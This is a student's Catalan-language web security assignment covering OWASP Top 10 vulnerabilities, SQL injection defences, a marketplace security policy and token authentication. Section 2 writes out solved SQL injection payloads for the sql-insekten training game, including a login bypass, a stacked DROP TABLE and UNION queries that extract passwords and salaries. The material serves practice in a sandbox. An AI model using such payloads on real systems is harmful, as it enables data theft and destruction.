## **1. L’organització [OWASP Foundation](https://owasp.org/Top10/es/) va actualitzar en 2021 el seu Top 10 de vulnerabilitats més trobades en aplicacions web.** 

### **a. Escull 3 vulnerabilitats d’aquesta llista i descriu-les. Escriu l’impacte que tenen a la seguretat i quins danys pot arribar a fer un atac en aquesta vulnerabilitat. Enumera diferents mesures i tècniques per poder evitar-les.**

1. <u>Pèrdua de Control d'Accés:</u>

- Descripció:

Aquesta vulnerabilitat passa quan falla o falta un mecanisme de control d’accés, això significa que un usuari pot accedir a un recurs que aquesta està fora dels permisos previstos

- Impacte i danys:

L’impacte que té aquesta vulnerabilitat depèn dels permisos que té sobre el servidor. En el cas d’empreses és comú que ocasioni des de fugues d’informació fins alteració de dades confidencials.

- Mesures per poder evitar-les:

Comprovar la implementació d'un control d’accés correcte, establint rols i permisos per accedir a cada recurs.

Posar que per defecte denegi l'entrada a excepció dels recursos públics.

2. Injecció

- Descripció:

És un atac que consisteix quan un agent maliciós aconsegueix passar informació no validada a un interprete, com a part d’una petició.

- Impacte i danys:

Poder modificar bases de dades o introduir dades errònies, entre altres.

- Mesures per poder evitar-les:


Emprar una API segura, que eviti totalment l'ús d'un intèrpret o proporcioni una interfície parametritzada.

Implementar validacions d'entrades de dades al servidor, utilitzant entrada positiva o whitelist.

3. Falles al Registre i Monitorització

- Descripció:

La intenció és donar suport a la detecció, escalament i resposta davant bretxes actives. Sense registres i monitoratge, les bretxes no poden ser detectades.

- Impacte i danys:

No emmagatzemar registres durant el temps suficient, no registrar esdeveniments de seguretat importants o no supervisar els registres a la recerca d’activitat sospitosa, entre altres.

- Mesures per poder evitar-les:

Revisar i analitzar periòdicament els registres.

Emmagatzemar i protegir de manera segura els fitxers de registre.


## **2. Obre el següent enllaç [(sql inseckten)](https://www.sql-insekten.de/) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL.** 

**a. Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.**

Nivell 1:

SELECT username 

FROM users 

WHERE username ='jane'--' AND password ='d41d8cd98f00b204e9800998ecf8427e';

En aquest nivell posem el nom d'usuari a jane i comentem la part on el programa el válida.

Nivell 2:

SELECT username 

FROM users 

WHERE username ='';DROP TABLE users; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';

En aquest nivell em d’escriure DROP TABLE users per esborrar completament la taula de users i després comentar l’altre part del codi.

Nivell 3:

SELECT username 

FROM users 

WHERE username ='' OR 1=1; --' AND password ='d41d8cd98f00b204e9800998ecf8427e'

En aquest nivell escrivim OR 1=1 per aixins perque si o si sigui true.

Nivell 4:

SELECT username 

FROM users 

WHERE username ='' OR 1=1 ORDER BY user_id LIMIT 1 --' AND password ='d41d8cd98f00b204e9800998ecf8427e';

En aquest nivell es el mateix que el nivell 3 pero aquí hem de posar un LIMIT per a que aixins només agafi un usuari.

Nivell 5:

SELECT product_id, brand, size, price 

FROM shoes 

WHERE brand='' UNION select username, password from users; --';

En aquest nivell escrivim UNION per escriure un select darrere d’un altre i aixins poder fer el select de tota la base de dades.

Nivell 6:

SELECT username 

FROM users 

WHERE username ='' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' -- ' AND password ='d41d8cd98f00b204e9800998ecf8427e';

En aquest nivell fem un altre UNION per fer un select a la taula de staff.

Nivell 7:

SELECT product_id, brand, size, price 

FROM shoes 

WHERE brand='' UNION SELECT name, email, salary, employed_since FROM staff --';

En aquest nivell fem un altre UNION i fem un select per mostrar, nom, email, salari i desde quan treballa, en la taula de staff.

**b. Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i Entity Framework.**

1. Ús de les consultes parametritzades

- Les consultes parametritzades en Entity Framework eliminen el risc d'injecció SQL, ja que les dades proporcionades per l'usuari es tracten com a valors separats dels comandaments SQL.

2. Validació i neteja de les dades d'entrada

- Implementa validacions per assegurar-te que les dades introduïdes compleixen els formats esperats (com ara correus electrònics, números, etc.).

- Neteja les dades d'entrada per evitar que contingui codi maliciós.

3. Evitar consultes dinàmiques

- No construeixis cadenes SQL manualment amb dades d'entrada de l'usuari. Les consultes dinàmiques són especialment vulnerables.

4. Configurar els permisos de la base de dades

- Limita els permisos que tenen les aplicacions a la base de dades. Per exemple, utilitza usuaris amb accés només de lectura en lloc de donar permisos amplis

## **3. L’empresa a la qual treballes desenvoluparà una aplicació web de venda d’obres d’art. Els artistes registren les seves obres amb fotografies, títol, descripció i preu.  Els clients poden comprar les obres i poden escriure ressenyes públiques dels artistes a qui han comprat. Tant clients com artistes han d’estar registrats. L’aplicació guarda nom, cognoms, adreça completa, dni i telèfon. En el cas dels artistes guarda les dades bancaries per fer els pagaments. Hi ha un tipus d’usuari Acount Manager que s’encarrega de verificar als nous artistes. Un cop aprovats poden pública i vendre les seves obres.**

**Ara es vol aplicar aplicant els principis  de seguretat per tal de garantir el servei i la integritat de les dades. T’han encarregat l'elaboració de part de les polítiques de seguretat. Elabora els següents apartats:**

**a. Definició del control d’accés: enumera els rols  i quin accés a dades tenen cada rol**

- Artistes:
  
Rols: Registrar les seves obres amb fotografies, títol, descripció i preu. Publicar les seves obres i vendreles.

Dades: Fotografies, títol, descripció i preu de les seves obres. Nom, cognoms, adreça completa, dni, telèfon i dades bancàries.

- Clients:

Rols: Comprar les obres i poden escriure ressenyes públiques dels artistes a qui han comprat.

Dades: Obres i ressenyes. Nom, cognoms, adreça completa, dni, telèfon i dades bancàries.

- Account Manager:

Rols: S’encarrega de verificar als nous artistes.

Dades: Informació artistes.

**b. Definició de la política de contrasenyes: normes de creació, d’ús i canvi de contrasenyes. Raona si són necessàries diferents polítiques segons el perfil d’usuari.**

Client: Ha de tenir una contrasenya de 8 caràcters com a mínim, amb una majúscula, una minúscula, un número i un caràcter especial.

Artistes: Ha de tenir una contrasenya de 12 caràcters com a mínim, amb una majúscula, una minúscula, un número i un caràcter especial.

Account Manager: Ha de tenir una contrasenya de 12 caràcters com a mínim, amb una majúscula, una minúscula, un número, dos caràcters especials i cada tres mesos es canvia.

El client no necessita tanta seguretat com l’artista i l'account manager.

L’artista necessita seguretat, però tampoc tanta perquè l’usuari no vulgui fer servir el servei.

L’account manager necessita seguretat perquè és l’encarregat de què els contes funcionin i estén bé.

**c. Avaluació de la informació: determina quin valor tenen les dades que treballa l'aplicació. Determina com tractar les dades més sensibles. Quines dades encriptaries?**

Les dades com nom, DNI, adreça, etc. no són molt importants comparades amb les dades bancàries o contrasenyes.

Les dades bancàries són les més importants per encriptar i també encriptaria les contrasenyes.

## **4. En el control d’accessos, existeixen mètodes d’autenticació basats en tokens. Defineix l’autenticació basada en tokens. Quins tipus hi ha? Com funciona mitjançant la web? Cerca llibreries .Net que ens poden ajudar a implementar autenticació amb tokens.**

L'autenticació basada en tokens, és que validi la identitat fent servir la comprovació amb token.

Tipus:

- Tokens connectats:

 Tokens connectats són dispositius físics que l’usuari pot connectar al seu ordinador o sistema.

- Tokens sense contacte:

  Els tokens sense contacte funcionant connectant-se i comunicant-se amb un ordinador de prop sense estar físicament connectat al servidor.

- Tokens desconnectats

Els tokens desconnectats permeten als usuaris verificar la seva identitat emetent un codi que després han d’ingressar manualment per obtenir accés al seu servei.

- Tokens de software

Els tokens de software solen ser aplicacions de mòbils que permeten als usuaris proporcionar ràpidament i fàcilment una forma de 2FA.

- Token Web JSON (JWT)

Els tokens web JSON (JWT) permeten una comunicació segura entre dues parts mitjançant un estàndard obert de la indústria.

- Token Web

És un missatge enviat des d'un servidor a un client i que emmagatzema temporalment. El client inclou una còpia del token a les següents sol·licituds enviades al servidor per confirmar l'estat d'autenticació del client.

**Llibreries:**

- ASP.NET Core Identity: 

Aquesta llibreria permet utilitzar tokens JWT per autenticar usuaris i accedir a recursos.

- Microsoft Authentication Library (MSAL): 

MSAL és una llibreria que facilita l'adquisició de tokens per a aplicacions públiques i confidencials. És útil per integrar autenticació amb Microsoft Entra ID (abans Azure AD).

- JwtBearer Middleware: 

Aquesta llibreria permet configurar autenticació basada en tokens JWT en aplicacions ASP.NET Core. 


## **5. Crea un projecte de consola amb un menú amb tres opcions:**

**a. Registre: l’usuari ha d’introduir username i una password. De la combinació dels dos camps guarda en memòria directament l'encriptació. Utilitza l’encriptació de hash HA256. Mostra per pantalla el resultat.**

**b. Verificació de dades: usuari ha de tornar a introduir les dades el programa mostra per pantalla si les dades són correctes.**

**c. Encriptació i desencriptació amb RSA. L’usuari entrarà un text per consola. A continuació mostra el text encriptat i en la següent línia el text desencriptat. L’algoritme de RSA necessita una clau pública per encriptar i una clau privada per desencriptar. No cal guardar-les en memòria persistent.**

**Per realitzar aquest exercici utilitza la llibreria System.Security.Cryptography.**

## **6. Indica les referències que has consultat, seguint el següent format:**

Adriel Araujo (6 de 7 de 2021). Vulnerabilidades: Qué es Broken Access Control y cómo solucionarlo. hackmetrix. Recuperat el 24/4/2025 de [Link](https://blog.hackmetrix.com/broken-access-control/)

Santi Oliver (30 de 10 de 2024). INYECCIONES: La tercera vulnerabilidad con más presencia en las aplicaciones web. inlab. Recuperat el 24/4/2025 de [Link](https://inlab.fib.upc.edu/es/articulos/inyecciones-la-tercera-vulnerabilidad-con-mas-presencia-en-las-aplicaciones-web/2024/)

GenCat (8 de 11 de 2022). Contrasenyes segures. GenCat. Recuperat el 25/4/2025 de [Link](https://mossos.gencat.cat/ca/consells_de_seguretat/tecnologia/mobils/contrasenyes-segures/index.html)

CloudFlare (No especifica). ¿Qué es la autenticación basada en token?. CloudFlare. Recuperat el 25/4/2025 de [Link](https://www.cloudflare.com/es-es/learning/access-management/token-based-authentication/)

Fortinet (No especifica). ¿Qué es un token de autenticación?. Fortinet. Recuperat el 25/4/2025 de [Link](https://www.fortinet.com/lat/resources/cyberglossary/authentication-token)
